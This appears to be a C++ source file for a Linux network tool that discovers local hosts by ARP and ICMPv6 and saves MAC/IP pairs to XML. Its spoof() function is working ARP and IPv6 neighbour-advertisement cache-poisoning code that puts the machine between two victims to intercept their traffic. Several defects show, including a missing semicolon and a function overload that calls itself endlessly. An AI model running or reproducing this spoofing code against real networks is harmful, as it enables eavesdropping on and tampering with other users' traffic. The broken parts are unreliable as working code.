
#include <iostream>
#include "scanner.h"


using namespace std;

int _interrupted = 0;

char *string2char(string str){
	char * writable = new char[str.size() + 1];
	std::copy(str.begin(), str.end(), writable);
	writable[str.size()] = '\0'; // don't forget the terminating 0
	return writable;
}

string mac_bytes2str(unsigned char *src){
	char tmp[15];

	for (int i = 0; i < 6; i++){
	    sprintf(&tmp[2*i], "%02x", src[i]);
	}

	string res(tmp);
	res.insert(4,1,'.');
	res.insert(9,1,'.');
	return res;
}

void mac_str2bytes(string str, unsigned char *dst){
	const char *tmp = str.c_str();
	const char *pos = tmp;
	int i = 0;
	int write_index = 0;

	while (i < 14){
		if (tmp[i] == '.'){
			i += 1;
			continue;
		}
		sscanf(pos+i, "%2hhx", &dst[write_index]);
		write_index += 1;
		i += 2;
	}
}

void mac_str2bytes(char *str, unsigned char *dst){
	string s(str);
	mac_str2bytes(str, dst);
}

NetworkScanner::NetworkScanner(){
	socketd = -1;
	socket_opened = false;
	memset(&iface, 0, sizeof(struct interface));
	recv_timeout_s = 2;
}


void int_handler(int s){
	_interrupted = 1;
}

void NetworkScanner::scan(char *iname, char *filename){
	struct sigaction sig_handler;
	sig_handler.sa_handler = int_handler;
	sigemptyset(&sig_handler.sa_mask);
	sig_handler.sa_flags = 0;
	sigaction(SIGINT, &sig_handler, NULL);

	this->openSocket(AF_PACKET, SOCK_RAW, ETH_P_ALL);
	this->loadInterfaceInfo(iname);
	// Closes old socket and creates new one
	this->openSocket(AF_PACKET, SOCK_RAW, ETH_P_ARP);
	this->scanIpv4Hosts(3);
	this->openSocket(PF_PACKET, SOCK_RAW, ETH_P_ALL);
	this->scanIpv6Hosts(3);
#ifdef DEBUG
	this->printResult();
#endif
	this->write(filename);
}

void NetworkScanner::printResult(){
	for (auto const& x : this->mac_ip)
	{
	    cout << x.first << ": ";
	    for (auto i = x.second.begin(); i != x.second.end(); ++i){
	        cout << *i << ", ";
		}
	    cout << endl;
	}
}
/**
 * Send ARP request to desired address
 */

void NetworkScanner::sendARPRequest(unsigned int ip_dst, unsigned int ip_src, unsigned char *mac_src, unsigned char *mac_dst){
	struct arp_packet arp_request;
	struct sockaddr_ll sll;
    uint32_t src_ip = htonl(ip_src);
    uint32_t dst_ip = htonl(ip_dst);
    unsigned char src_mac[6];
    unsigned char dst_mac[6];

    memcpy(src_mac, mac_src, 6);
    memcpy(dst_mac, mac_dst, 6);

    memset(&arp_request, 0, sizeof(arp_request));
    memset(&sll, 0, sizeof(struct sockaddr_ll));

    // Configure sll
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = this->iface.index;
	sll.sll_hatype = htons(ARPHRD_ETHER);
	sll.sll_pkttype = PACKET_BROADCAST;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_halen = MAC_LENGTH;

	// Configure ethernet header
	memcpy(arp_request.eth.target_mac, dst_mac, MAC_LENGTH);
	memcpy(arp_request.eth.source_mac, src_mac, MAC_LENGTH);
	arp_request.eth.protocol = htons(ETH_P_ARP);

	// Configure arp header
	arp_request.arp.hwtype = htons(1);
	arp_request.arp.prottype = htons(ETH_P_IP);
	arp_request.arp.hw_addr_len = MAC_LENGTH;
	arp_request.arp.prot_addr_len = 4;
	arp_request.arp.opcode = htons(ARPOP_REQUEST);
	memcpy(arp_request.arp.source_mac, src_mac, MAC_LENGTH);
	memcpy(arp_request.arp.source_ip, &src_ip, sizeof(uint32_t));
	memcpy(arp_request.arp.target_mac, dst_mac, MAC_LENGTH);
	memcpy(arp_request.arp.target_ip, &dst_ip, sizeof(uint32_t));

	// Bind socket
	if (bind(this->socketd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0){
		perror("Unable to bind socket.");
		return;
	}

    int ret = sendto(this->socketd, &arp_request, 42, 0, (struct sockaddr *) &sll, sizeof(sll));
    if (ret == -1){
    	perror("Could not send ARP request");
    }

}

/**
 * Send ARP request to desired address
 */
void NetworkScanner::sendARPReply(unsigned int ip_dst, unsigned int ip_src, unsigned char *mac_src, unsigned char *mac_dst){
	struct arp_packet arp_reply;
	struct sockaddr_ll sll;
    uint32_t src_ip = ip_src;
    uint32_t dst_ip = ip_dst;
    unsigned char src_mac[6];
    unsigned char dst_mac[6];

    memcpy(src_mac, mac_src, 6);
    memcpy(dst_mac, mac_dst, 6);

    memset(&arp_reply, 0, sizeof(arp_reply));
    memset(&sll, 0, sizeof(struct sockaddr_ll));

    // Configure sll
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = this->iface.index;
	sll.sll_hatype = htons(ARPHRD_ETHER);
	sll.sll_pkttype = PACKET_BROADCAST;
	sll.sll_protocol = htons(ETH_P_ARP);
	sll.sll_halen = MAC_LENGTH;

	// Configure ethernet header
	memcpy(arp_reply.eth.target_mac, dst_mac, MAC_LENGTH);
	memcpy(arp_reply.eth.source_mac, src_mac, MAC_LENGTH);
	arp_reply.eth.protocol = htons(ETH_P_ARP);

	// Configure arp header
	arp_reply.arp.hwtype = htons(1);
	arp_reply.arp.prottype = htons(ETH_P_IP);
	arp_reply.arp.hw_addr_len = MAC_LENGTH;
	arp_reply.arp.prot_addr_len = 4;
	arp_reply.arp.opcode = htons(ARPOP_REPLY);
	memcpy(arp_reply.arp.source_mac, src_mac, MAC_LENGTH);
	memcpy(arp_reply.arp.source_ip, &src_ip, sizeof(uint32_t));
	memcpy(arp_reply.arp.target_mac, dst_mac, MAC_LENGTH);
	memcpy(arp_reply.arp.target_ip, &dst_ip, sizeof(uint32_t));

	// Bind socket
	if (bind(this->socketd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0){
		perror("Unable to bind socket.");
		return;
	}

    int ret = sendto(this->socketd, &arp_reply, 42, 0, (struct sockaddr *) &sll, sizeof(sll));
    if (ret == -1){
    	perror("Could not send ARP request");
    }

}

void NetworkScanner::scanIpv4Hosts(int tries){
	unsigned int first = (this->iface.subnet_mask & this->iface.hostip) + 1;
	unsigned int broadcast = this->iface.hostip | (~this->iface.subnet_mask);
	unsigned char broadcast_mac[6];
	memset(broadcast_mac, 0xFF, 6);

	debug("Net address: %u, broadcast: %u", this->iface.subnet_mask, broadcast);
	std::thread receiver([=] {receiveARPRequest();});

	for (int i = 0; i < tries; i++){
		for (unsigned int target = first; target < broadcast; target++){
			if (_interrupted){
				break;
			}
			usleep(50);

			this->sendARPRequest(target, this->iface.hostip, this->iface.mac, broadcast_mac);
			// delay between arp requests
		}
		usleep(150);
	}
	receiver.join();
}

std::vector<string> NetworkScanner::getLocalIpv6Adresses(char *iface){
	vector<string> addresses;

	struct ifaddrs *ifa=NULL,*ifEntry=NULL;
	void *addPtr = NULL;
	int rc = 0;
	char addressBuffer[INET6_ADDRSTRLEN];

	rc = getifaddrs(&ifa);
	if (rc==0) {
		for(ifEntry=ifa; ifEntry!=NULL; ifEntry=ifEntry->ifa_next) {
			if(ifEntry->ifa_addr->sa_data == NULL) {
				continue;
			}
			if(ifEntry->ifa_addr->sa_family==AF_INET6 && (iface == NULL || !strcmp(ifEntry->ifa_name, iface))) {
				 addPtr = &((struct sockaddr_in6 *)ifEntry->ifa_addr)->sin6_addr;
			}
			else
				continue;

			const char *a = inet_ntop(ifEntry->ifa_addr->sa_family,
						  addPtr,
						  addressBuffer,
						  sizeof(addressBuffer));
			if(a != NULL) {
					addresses.push_back(string(a));
			}
		}
	}
	freeifaddrs(ifa);

	return addresses;
}

void NetworkScanner::scanIpv6Hosts(int tries){
	if (!this->iface.hostip6.size())
		return;

	std::thread receiver([=] {receiveICMPv6();});
	usleep(50);
	// Set destination MAC address to multicast
	char dst_mac[6];
	memset(dst_mac, 0, 6);
	dst_mac[0] = 0x33;
	dst_mac[1] = 0x33;
	dst_mac[5] = 0x01;

	char dst_ip[IPV6_ADDR_LEN];

    for (int i = 0; i < tries; i++){
		for(vector<string>::const_iterator it=this->iface.hostip6.begin(); it != this->iface.hostip6.end(); it++) {
			if (_interrupted){
				break;
			}

			char *src_ip = string2char(*it);
			memset(dst_ip, 0, IPV6_ADDR_LEN);
			memcpy(dst_ip, "ff02::1", 8);
			this->sendIcmpv6((char*)this->iface.mac, src_ip, dst_mac, dst_ip);
			usleep(50);
			memset(dst_ip, 0, IPV6_ADDR_LEN);
			memcpy(dst_ip, "ff02::2", 8);
			this->sendIcmpv6((char*)this->iface.mac, src_ip, dst_mac, dst_ip);
			delete[] src_ip;
		}
		usleep(300);
    }
    receiver.join();
    // Send NS to every discovered address
	std::thread receiver2([=] {receiveICMPv6();});
	usleep(50);
    for (int i = 0; i < tries; i++){
		for(vector<string>::const_iterator it=this->iface.hostip6.begin(); it != this->iface.hostip6.end(); it++) {
			for (auto const& x : this->mac_ip){
			    for (auto i = x.second.begin(); i != x.second.end(); ++i){
			    	if ((signed int)i->find('.') == -1){
			    		unsigned char tmp[6];
			    		mac_str2bytes(x.first, tmp);
			    		this->sendNeighBorSolitication(i->c_str(), it->c_str(), this->iface.mac, tmp);
			    	}
			    }
			}
		}
    }
    receiver2.join();
}

void NetworkScanner::receiveICMPv6(){
	struct icmpv6_packet *ping_response;
	uint16_t frame[IP_MAXPACKET];
	unsigned int bytes, i;
	int sckt = -1;
	socklen_t sendersize;
	struct timeval timeout;
	struct sockaddr sender;

	memset(frame, 0, IP_MAXPACKET * sizeof(uint16_t));
	memset(&ping_response, 0, sizeof(struct icmpv6_packet));
	memset(&sender, 0, sizeof(struct sockaddr));

	sendersize = sizeof(sender);

	sckt = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL));
  	timeout.tv_sec = 0;
  	timeout.tv_usec = 750;
  	setsockopt(sckt, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout,sizeof(struct timeval));
  	i = 0;
	while (i <= 1500){
		if (_interrupted){
			break;
		}
		  i += 1;
	      memset (frame, 0, IP_MAXPACKET * sizeof (uint8_t));
	      memset (&sender, 0, sizeof (sender));

	      if ((bytes = recvfrom (sckt, frame, IP_MAXPACKET, 0, (struct sockaddr *) &sender, &sendersize)) < 0) {
	    	  if (! (i % 500)){
	    		  debug("Nothing received");
	    	  }
	    	  continue;
	      }

	      if (bytes < sendersize){
	    	  debug("Short packet");
	    	  continue;
	      }
	      ping_response = (icmpv6_packet*) frame;

	      // Check for an IP ethernet frame, carrying ICMP echo reply. If not, ignore and keep listening.
	      if (htons(ping_response->eth.protocol) != ETH_P_IPV6){
	    	  debug("Received not-IPv6 packet: %02x, size %u", htons(ping_response->eth.protocol), bytes );
	    	  continue;
	      }


	      if (ping_response->ipv6.next_header != IPPROTO_ICMPV6){
	    	  debug("Received IPv6 packet, but it is not a ICMPv6 response.");
	    	  continue;
	      }
	      // Got ping response
	      debug("Got ping response");
	      char src_ip[25];
	      memset(src_ip, 0, 25);
	      inet_ntop (AF_INET6, ping_response->ipv6.source_ip, src_ip, INET6_ADDRSTRLEN);
	        i = 0;
	        usleep(100);

			string _mac = mac_bytes2str(ping_response->eth.source_mac);
			string _ip6(reinterpret_cast<char*>(src_ip));
			this->add(&(this->mac_ip), _mac, _ip6);
	      }
	if (sckt > 0)
		close(sckt);

}

void NetworkScanner::sendIcmpv6(const char *src_mac, const char *src_ip,
		const char *dst_mac, const char *dst_ip){

	struct icmpv6_packet ping;
	memset(&ping, 0, sizeof(struct icmpv6_packet));

	// Configure eth header
	// Set MAC to multicast
	memcpy(ping.eth.target_mac, dst_mac, MAC_LENGTH);
	memcpy(ping.eth.source_mac, src_mac, MAC_LENGTH);
	ping.eth.protocol = htons(ETH_P_IPV6);

	// Configure ipv6 header
	ping.ipv6.version_priority = 0x6F;
	*ping.ipv6.flow = 0x3C;
	ping.ipv6.payload_len = htons(8);
	ping.ipv6.next_header = IPPROTO_ICMPV6;
	ping.ipv6.hop_limit = 0xFF; // Set hop limit to maximum
	// Convert ipv6 strings to bytes
	inet_pton (AF_INET6, src_ip, ping.ipv6.source_ip);
	inet_pton (AF_INET6, dst_ip, ping.ipv6.target_ip);

	// Configure icmpv6 header
	ping.icmpv6.type = ICMP6_ECHO_REQUEST;
	ping.icmpv6.code = 0; // echo request
	ping.icmpv6.id = htons(::getpid());
	ping.icmpv6.seq = htons(0);
	ping.icmpv6.checksum = icmp6_checksum(ping);

	struct sockaddr_ll device;
	memset (&device, 0, sizeof (device));
	device.sll_ifindex = this->iface.index;
	device.sll_family = AF_PACKET;
	memcpy (device.sll_addr, this->iface.mac, 6 * sizeof (char));
	device.sll_halen = 6;


	if (sendto (this->socketd, &ping, sizeof(ping), 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
		perror ("sendto() failed ");
		exit (EXIT_FAILURE);
	}
}

void NetworkScanner::receiveARPRequest(){
	struct arp_packet arp;
	struct timeval timeout;
	int sckt, i;
	memset(&arp, 0, sizeof(struct arp_packet));

    debug("Receiving ARP responses");
	if ((sckt = socket(AF_PACKET, SOCK_RAW,  htons(ETH_P_ARP))) < 0){
		perror("Unable to initialize socket");
		return;
	}
	timeout.tv_sec = 0;
	timeout.tv_usec = 300;
	setsockopt(sckt, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout,sizeof(struct timeval));

	i = 0;
    while (i < 500){
		if (_interrupted){
			break;
		}
    	i += 1;
		int length = recvfrom(sckt, &arp, 60, 0, NULL, NULL);
		if (length <= 0) {
			continue;
		}

		if (ntohs(arp.eth.protocol) != PROTO_ARP) {
			debug("Not an ARP packet");
			continue;
		}
		if (ntohs(arp.arp.opcode) != ARP_REPLY) {
			debug("Not an ARP reply");
			continue;
		}
		// Got ARP reply, reset counter
		i = 0;

		struct in_addr sender_a;
		memset(&sender_a, 0, sizeof(struct in_addr));
		memcpy(&sender_a.s_addr, &(arp.arp.source_ip), sizeof(uint32_t));

		string _ip(reinterpret_cast<char*>(inet_ntoa(sender_a)));
		string _mac = mac_bytes2str(arp.arp.source_mac);
		this->add(&(this->mac_ip), _mac, _ip);
    }
    if (sckt > 0)
    	close(sckt);
}

void NetworkScanner::add(std::map<string, std::vector<string>> *dct, string key, string value){
	if (key.compare(mac_bytes2str(this->iface.mac)) == 0){ // Do not add self
		return;
	}

	std::map<string, std::vector<string>> &_dict = *dct;
	if (_dict.count(key)){

		if (find(_dict[key].begin(), _dict[key].end(),value) == _dict[key].end()){
			_dict[key].push_back(value);
		}

	}else{
		_dict[key];
		_dict[key].push_back(value);
	}
}

void NetworkScanner::openSocket(int packetType, int socketType, int unknown){
	if (socket_opened)
		this->closeSocket();

	debug("Opening socket");
	socketd = socket(packetType, socketType,  htons(unknown));
	if (socketd == -1){
		perror("Unable to initialize socket");
		exit(1);
	}
	// set timeout
	struct timeval timeout;
	timeout.tv_sec = 0;//this->recv_timeout_s;
	timeout.tv_usec = 100;
	setsockopt(socketd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout,sizeof(struct timeval));

	socket_opened = true;
}

void NetworkScanner::closeSocket(){
	if (socket_opened){
		debug("Closing socket");
		close(socketd);
	}
	socket_opened = false;
}

void NetworkScanner::loadInterfaceInfo(char *iname){
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(struct ifreq));
	debug("Getting information of interface '%s'", iname)
	if (strlen(iname) > (IFNAMSIZ - 1)){
		perror("Interface name is too long");
		exit(1);
	}
	debug("Copying interface name to ifreq structure");
	strncpy(ifr.ifr_name, iname, IFNAMSIZ);
	debug("Getting interface index");
	if (ioctl(socketd, SIOCGIFINDEX, &ifr) == -1) {
        perror("Unable to get interface index");
        exit(1);
    }
	this->iface.index = ifr.ifr_ifindex;
	debug("Successfully obtained interface index: %d", this->iface.index);
	debug("Getting source MAC address");
    if (ioctl(socketd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("Unable to get source MAC address");
        exit(1);
    }

    memcpy(&this->iface.mac, ifr.ifr_hwaddr.sa_data, 6);
    debug("Source MAC address: %02X:%02X:%02X:%02X:%02X:%02X", 	this->iface.mac[0],
    															this->iface.mac[1],
																this->iface.mac[2],
																this->iface.mac[3],
																this->iface.mac[4],
																this->iface.mac[5]
    		);

    if (ioctl(socketd, SIOCGIFADDR, &ifr) == -1) {
        perror("Unable to get source IPv4 address");
        exit(1);
    }

    struct sockaddr_in *in = (struct sockaddr_in*) &(ifr.ifr_addr);
    if (ifr.ifr_addr.sa_family == AF_INET){
    	this->iface.hostip = inet_network(inet_ntoa(in->sin_addr));
    }else{
    	fprintf(stderr, "Not an IPv4\n");
    	exit(1);
    }
    debug("Successfully got source IPv4 address: %s", inet_ntoa(in->sin_addr));

    if (ioctl(socketd, SIOCGIFNETMASK , &ifr) == -1) {
        perror("Unable to get subnet mask");
        exit(1);
    }
    struct sockaddr_in *inc = (struct sockaddr_in*) &(ifr.ifr_netmask);
    this->iface.subnet_mask = inet_network(inet_ntoa(inc->sin_addr))
    debug("Successfully got subnet mask: %s", inet_ntoa(inc->sin_addr));

    /////////////////////////////////
    ///////// LOAD IPv6 info ////////
    /////////////////////////////////
    this->iface.hostip6 = this->getLocalIpv6Adresses(iname);

}

void NetworkScanner::write(char *filename){
	xmlNodePtr node = NULL;
	xmlDocPtr doc = xmlNewDoc(BAD_CAST "1.0");
	xmlNodePtr devices = xmlNewNode(NULL, BAD_CAST "devices");
    xmlDocSetRootElement(doc, devices);

	for (auto const& x : this->mac_ip)
	{
	    node = xmlNewChild(devices, NULL, BAD_CAST "host", NULL);
	    xmlNewProp(node, BAD_CAST "mac", BAD_CAST x.first.c_str());

	    for (auto i = x.second.begin(); i != x.second.end(); ++i){
			xmlNewChild(node, NULL, BAD_CAST ((signed int)i->find('.') == -1 ? "ipv6" : "ipv4"),
                    BAD_CAST i->c_str());
		}
	}

    xmlSaveFormatFileEnc(filename, doc, "UTF-8", 1);
}


//void NetworkScanner::sendARPReply(unsigned int ip_dst, unsigned int ip_src, unsigned char *mac_src, unsigned char *mac_dst){
void NetworkScanner::spoof(char *iface, char *protocol, unsigned int interval, char *ip1, char *mac1, char *ip2, char *mac2){
	struct sigaction sig_handler;
	sig_handler.sa_handler = int_handler;
	sigemptyset(&sig_handler.sa_mask);
	sig_handler.sa_flags = 0;
	sigaction(SIGINT, &sig_handler, NULL);

	this->openSocket(AF_PACKET, SOCK_RAW, ETH_P_ALL);
	this->loadInterfaceInfo(iface);
	unsigned char tmp_mac1[6];
	unsigned char tmp_mac2[6];
	mac_str2bytes(string(mac1), tmp_mac1);
	mac_str2bytes(string(mac2), tmp_mac2);

	if (strcmp(protocol, "arp") == 0){
		this->openSocket(AF_PACKET, SOCK_RAW, ETH_P_ARP);

		while (!_interrupted){
			this->sendARPReply(inet_addr(ip1), inet_addr(ip2), this->iface.mac, tmp_mac1);
			usleep(500);
			this->sendARPReply(inet_addr(ip2), inet_addr(ip1), this->iface.mac, tmp_mac2);
			usleep(interval*1000);
		}
		this->sendARPReply(inet_addr(ip1), inet_addr(ip2), tmp_mac2, tmp_mac1);
		usleep(500);
		this->sendARPReply(inet_addr(ip2), inet_addr(ip1), tmp_mac1, tmp_mac2);

	}else{ // ndp
		this->openSocket(PF_PACKET, SOCK_RAW, ETH_P_ALL);
		while (!_interrupted){
			this->sendNeighBorAdvertisement(this->iface.mac, tmp_mac2, ip1, ip2, this->iface.mac);
			usleep(500);
			this->sendNeighBorAdvertisement(this->iface.mac, tmp_mac1, ip2, ip1, this->iface.mac);
    		usleep(interval * 1000);
		}
		// Fix network
		this->sendNeighBorAdvertisement(tmp_mac1, tmp_mac2, ip1, ip2, tmp_mac1);
		usleep(500);
		this->sendNeighBorAdvertisement(tmp_mac1, tmp_mac1, ip2, ip1, tmp_mac1);

	}
}

void NetworkScanner::sendNeighBorSolitication(const char *ip_dst, const char *ip_src, unsigned char *mac_src, unsigned char *mac_dst){
	struct ns_packet ns;
	memset(&ns, 0, sizeof(struct ns_packet));

	// Configure eth header
	memcpy(ns.eth.target_mac, mac_dst, MAC_LENGTH);
	memcpy(ns.eth.source_mac, mac_src, MAC_LENGTH);
	ns.eth.protocol = htons(ETH_P_IPV6);

	// Configure ipv6 header
	ns.ipv6.version_priority = 0x6F;
	*ns.ipv6.flow = 0x3C;
	ns.ipv6.payload_len = htons(32);
	ns.ipv6.next_header = IPPROTO_ICMPV6;
	ns.ipv6.hop_limit = 0xFF; // Set hop limit to maximum
	// Convert ipv6 strings to bytes
	inet_pton (AF_INET6, ip_src, ns.ipv6.source_ip);
	inet_pton (AF_INET6, ip_dst, ns.ipv6.target_ip);
	// Configure icmpv6 header
	ns.icmpv6.type = 135; // Neighbour solicit
	ns.icmpv6.code = 0;
	inet_pton (AF_INET6, ip_dst, ns.icmpv6.target_address);
	//memcpy(ns.icmpv6.target_address, ip_dst, IPV6_ADDR_LEN);
	ns.icmpv6.reserved = 0;
	ns.icmpv6.option.type = 1; // Source LL
	ns.icmpv6.option.length = 1; // 8bytes
	memcpy(ns.icmpv6.option.data, mac_src, 6);
	ns.icmpv6.checksum = icmp6_checksum_ns(ns) - htons(0x18);
	//ns.ipv6.payload_len = htons(32);

	struct sockaddr_ll device;
	memset (&device, 0, sizeof (device));
	device.sll_ifindex = this->iface.index;
	device.sll_family = AF_PACKET;
	memcpy (device.sll_addr, this->iface.mac, 6 * sizeof (char));
	device.sll_halen = 6;

	if (sendto (this->socketd, &ns, sizeof(ns), 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
		perror ("sendto() failed ");
		exit (EXIT_FAILURE);
	}
}

void NetworkScanner::sendNeighBorAdvertisement(unsigned char *mac_src, unsigned char *mac_dst, const char *ip_src, const char *ip_dst, unsigned char *option){
	struct ns_packet ns;
	memset(&ns, 0, sizeof(struct ns_packet));

	// Configure eth header
	memcpy(ns.eth.target_mac, mac_dst, MAC_LENGTH);
	memcpy(ns.eth.source_mac, mac_src, MAC_LENGTH);
	ns.eth.protocol = htons(ETH_P_IPV6);

	// Configure ipv6 header
	ns.ipv6.version_priority = 0x60;
	//*ns.ipv6.flow = 0x3C;
	ns.ipv6.payload_len = htons(32);
	ns.ipv6.next_header = IPPROTO_ICMPV6;
	ns.ipv6.hop_limit = 0xFF; // Set hop limit to maximum
	// Convert ipv6 strings to bytes
	inet_pton (AF_INET6, ip_src, ns.ipv6.source_ip);
	inet_pton (AF_INET6, ip_dst, ns.ipv6.target_ip);
	// Configure icmpv6 header
	ns.icmpv6.type = 136; // Neighbour advertisement
	ns.icmpv6.code = 0;
	inet_pton (AF_INET6, ip_src, ns.icmpv6.target_address);
	//memcpy(ns.icmpv6.target_address, ip_dst, IPV6_ADDR_LEN);
	ns.icmpv6.reserved = htonl((1 << 29) + (1<<30)); // Set S and O flags
	ns.icmpv6.option.type = 2; // Target LL
	ns.icmpv6.option.length = 1; // 8bytes
	memcpy(ns.icmpv6.option.data, option, 6);
	ns.icmpv6.checksum = icmp6_checksum_ns(ns) - htons(0x18);


	struct sockaddr_ll device;
	memset (&device, 0, sizeof (device));
	device.sll_ifindex = this->iface.index;
	device.sll_family = AF_PACKET;
	memcpy (device.sll_addr, this->iface.mac, 6 * sizeof (char));
	device.sll_halen = 6;


	if (sendto (this->socketd, &ns, sizeof(ns), 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
		perror ("sendto() failed ");
		exit (EXIT_FAILURE);
	}
}

// Computing the internet checksum (RFC 1071).
// Note that the internet checksum does not preclude collisions.
uint16_t
checksum (uint16_t *addr, int len)
{
	int count = len;
	register uint32_t sum = 0;
	uint16_t answer = 0;

	// Sum up 2-byte values until none or only one byte left.
	while (count > 1) {
		sum += *(addr++);
		count -= 2;
	}

	// Add left-over byte, if any.
	if (count > 0) {
		sum += *(uint8_t *) addr;
	}

	// Fold 32-bit sum into 16 bits; we lose information by doing this,
	// increasing the chances of a collision.
	// sum = (lower 16 bits) + (upper 16 bits shifted right 16 bits)
	while (sum >> 16) {
		sum = (sum & 0xffff) + (sum >> 16);
	}

	// Checksum is one's compliment of sum.
	answer = ~sum;

	return (answer);
}

uint16_t icmp6_checksum (struct icmpv6_packet packet)
{
	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;

	ptr = &buf[0];  // ptr points to beginning of buffer buf

	// Copy source IP address into buf (128 bits)
	memcpy(ptr, packet.ipv6.source_ip, IPV6_ADDR_LEN);
	ptr += IPV6_ADDR_LEN;
	chksumlen += IPV6_ADDR_LEN;

	// Copy destination IP address into buf (128 bits)
	memcpy (ptr, packet.ipv6.target_ip, IPV6_ADDR_LEN);
	ptr += IPV6_ADDR_LEN;
	chksumlen += IPV6_ADDR_LEN;

	// Copy Upper Layer Packet length into buf (32 bits).
	// Should not be greater than 65535 (i.e., 2 bytes).
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	*ptr = 8 / 256;
	ptr++;
	*ptr = 8 % 256;
	ptr++;
	chksumlen += 4;

	// Copy zero field to buf (24 bits)
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 3;

	// Copy next header field to buf (8 bits)
	memcpy(ptr, &packet.ipv6.next_header, sizeof(packet.ipv6.next_header));
	ptr += sizeof(packet.ipv6.next_header);
	chksumlen += sizeof(packet.ipv6.next_header);

	// Copy ICMPv6 type to buf (8 bits)
	memcpy(ptr, &packet.icmpv6.type, sizeof(packet.icmpv6.type));
	ptr += sizeof(packet.icmpv6.type);
	chksumlen += sizeof(packet.icmpv6.type);

	// Copy ICMPv6 code to buf (8 bits)
	memcpy(ptr, &packet.icmpv6.code, sizeof(packet.icmpv6.code));
	ptr += sizeof(packet.icmpv6.code);
	chksumlen += sizeof(packet.icmpv6.code);

	// Copy ICMPv6 ID to buf (16 bits)
	memcpy(ptr, &packet.icmpv6.id, sizeof(packet.icmpv6.id));
	ptr += sizeof (packet.icmpv6.id);
	chksumlen += sizeof (packet.icmpv6.id);

	// Copy ICMPv6 sequence number to buff (16 bits)
	memcpy(ptr, &packet.icmpv6.seq, sizeof(packet.icmpv6.seq));
	ptr += sizeof(packet.icmpv6.seq);
	chksumlen += sizeof(packet.icmpv6.seq);

	// Copy ICMPv6 checksum to buf (16 bits)
	// Zero, since we don't know it yet.
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 2;


	// Copy ICMPv6 payload to buf
	return checksum ((uint16_t *) buf, chksumlen);
}

uint16_t icmp6_checksum_ns (struct ns_packet packet)
{
	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;

	ptr = &buf[0];  // ptr points to beginning of buffer buf

	// Copy source IP address into buf (128 bits)
	memcpy(ptr, packet.ipv6.source_ip, IPV6_ADDR_LEN);
	ptr += IPV6_ADDR_LEN;
	chksumlen += IPV6_ADDR_LEN;

	// Copy destination IP address into buf (128 bits)
	memcpy (ptr, packet.ipv6.target_ip, IPV6_ADDR_LEN);
	ptr += IPV6_ADDR_LEN;
	chksumlen += IPV6_ADDR_LEN;

	// Copy Upper Layer Packet length into buf (32 bits).
	// Should not be greater than 65535 (i.e., 2 bytes).
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	*ptr = 8 / 256;
	ptr++;
	*ptr = 8 % 256;
	ptr++;
	chksumlen += 4;

	// Copy zero field to buf (24 bits)
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 3;

	// Copy next header field to buf (8 bits)
	memcpy(ptr, &packet.ipv6.next_header, sizeof(packet.ipv6.next_header));
	ptr += sizeof(packet.ipv6.next_header);
	chksumlen += sizeof(packet.ipv6.next_header);

	// Copy ICMPv6 type to buf (8 bits)
	memcpy(ptr, &packet.icmpv6.type, sizeof(packet.icmpv6.type));
	ptr += sizeof(packet.icmpv6.type);
	chksumlen += sizeof(packet.icmpv6.type);

	// Copy ICMPv6 code to buf (8 bits)
	memcpy(ptr, &packet.icmpv6.code, sizeof(packet.icmpv6.code));
	ptr += sizeof(packet.icmpv6.code);
	chksumlen += sizeof(packet.icmpv6.code);

	// Copy ICMPv6 code to buf (8 bits)
	memcpy(ptr, &packet.icmpv6.reserved, sizeof(packet.icmpv6.reserved));
	ptr += sizeof(packet.icmpv6.reserved);
	chksumlen += sizeof(packet.icmpv6.reserved);

	// Copy ICMPv6 ID to buf (16 bits)
	memcpy(ptr, packet.icmpv6.target_address, sizeof(packet.icmpv6.target_address));
	ptr += sizeof(packet.icmpv6.target_address);
	chksumlen += sizeof(packet.icmpv6.target_address);

	memcpy(ptr, &packet.icmpv6.option, sizeof(packet.icmpv6.option));
	ptr += sizeof(packet.icmpv6.option);
	chksumlen += sizeof(packet.icmpv6.option);

	// Copy ICMPv6 checksum to buf (16 bits)
	// Zero, since we don't know it yet.
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 2;

	// Copy ICMPv6 payload to buf
	return checksum ((uint16_t *) buf, chksumlen);
}



